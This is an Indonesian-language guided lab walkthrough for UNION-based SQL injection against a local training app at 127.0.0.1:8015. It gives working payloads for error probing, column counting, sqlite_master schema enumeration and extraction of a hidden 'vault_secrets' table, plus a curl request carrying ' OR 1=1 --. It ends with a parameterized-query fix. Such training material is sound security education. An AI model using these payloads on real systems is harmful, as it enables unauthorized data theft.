# Panduan Praktik Terbimbing: Investigasi & Eksploitasi SQL Injection UNION

Panduan ini disusun menggunakan metodologi 4-Tier Mission Progression dengan proporsi **60% observasi manual** dan **40% eksekusi perintah alat**:

---

## Tier 1: Observasi Permukaan Serangan (Bobot: 15%)

1. **Pastikan Kontainer Lab Aktif**:
   Buka peramban web dan navigasi ke alamat target:
   `http://127.0.0.1:8015`

2. **Uji Perilaku Normal Aplikasi**:
   - Amati antarmuka web *Central Logistics Hardware Catalog*.
   - Pada kolom pencarian produk, ketik kata kunci: `Server` lalu klik tombol **Search**.
   - **Hasil Observasi**: Tabel merespons dengan menampilkan produk yang cocok (`Rackmount Server 2U`, Kategori: `Hardware`, Harga: `$3499.5`).
   - Perhatikan bahwa tabel menampilkan **3 kolom data**: `Product Name`, `Category`, dan `Price (USD)`.

---

## Tier 2: Penemuan Endpoint & Injeksi Kesalahan (Bobot: 25%)

1. **Uji Karakter Kontrol Pembatas String**:
   Pada kotak pencarian, masukkan karakter petik tunggal (`'`):
   ```text
   '
   ```
   Tekan **Search** dan amati responsnya.

2. **Analisis Pesan Kesalahan Database**:
   Layar menampilkan kotak merah berisi kesalahan diagnostik:
   ```text
   Database Error:
   unrecognized token: "'%"
   ```
   *Kesimpulan Analisis*: Aplikasi menggabungkan input pengguna secara langsung ke dalam sintaks query SQLite tanpa sanitasi. Tanda petik berhasil memecah pembatas string query!

3. **Tentukan Jumlah Kolom Asli (Column Probing)**:
   Gunakan teknik probe `ORDER BY` atau `UNION SELECT` untuk memastikan jumlah kolom query:
   - Masukkan payload:
     ```text
     ' UNION SELECT 1, 2, 3 --
     ```
   - **Hasil Observasi**: Tabel berhasil menampilkan baris tambahan dengan nilai `1`, `2`, dan `$3.0`. Ini membuktikan query asli mengembalikan tepat **3 kolom data**.

---

## Tier 3: Pemetaan Skema & Ekstraksi Flag Rahasia (Bobot: 35%)

1. **Eksplorasi Skema Database (sqlite_master)**:
   Manfaatkan tabel master internal SQLite untuk melihat seluruh daftar tabel:
   ```text
   ' UNION SELECT tbl_name, sql, 0 FROM sqlite_master WHERE type='table' --
   ```
   Klik **Search** dan tinjau baris hasil di tabel:
   - Terlihat tabel umum: `products`.
   - Terlihat tabel rahasia tersembunyi: `vault_secrets` dengan definisi kolom `(id INTEGER, secret_name TEXT, secret_data TEXT)`.

2. **Ekstraksi Data dari Tabel vault_secrets**:
   Susun payload eksfiltrasi untuk memproyeksikan isi kolom `secret_name` dan `secret_data`:
   ```text
   ' UNION SELECT secret_name, secret_data, 0 FROM vault_secrets --
   ```

3. **Ekstraksi Flag Otorisasi**:
   Tabel hasil pencarian kini menampilkan rekaman rahasia:
   - **Product Name**: `PROJECT_ZITERA_CORE_FLAG`
   - **Category**: Memuat flag master dalam format standar `FLAG: ZITERA{...}`.
   - Salin nilai token flag yang muncul pada layar dan submit ke tab **Challenge** atau validator.

---

## Tier 4: Validasi Perbaikan & Hardening Defensif (Bobot: 25%)

1. **Uji Ketahanan Defensif Menggunakan cURL**:
   Kirimkan payload injeksi boolean universal dari terminal untuk melihat apakah data bocor:
   ```bash
   curl -s "http://127.0.0.1:8015/?q=%27+OR+1%3D1+--"
   ```
   *Pada sistem yang rentan*, seluruh isi tabel produk langsung terpapar.

2. **Terapkan Prepared Statements**:
   Pada kode backend (`app.py`), ubah query konkatenasi menjadi parameterized query:
   ```python
   # Perbaikan Aman: Gunakan placeholder '?'
   c.execute("SELECT name, category, price FROM products WHERE name LIKE ?", (f"%{query}%",))
   ```

3. **Verifikasi Hasil Perbaikan**:
   Setelah perbaikan diterapkan, input `'` atau `' OR 1=1 --` akan diperlakukan murni sebagai teks pencarian biasa. Sistem tidak lagi memicu error database dan mengembalikan pesan aman:
   *"No inventory items found matching your query."*
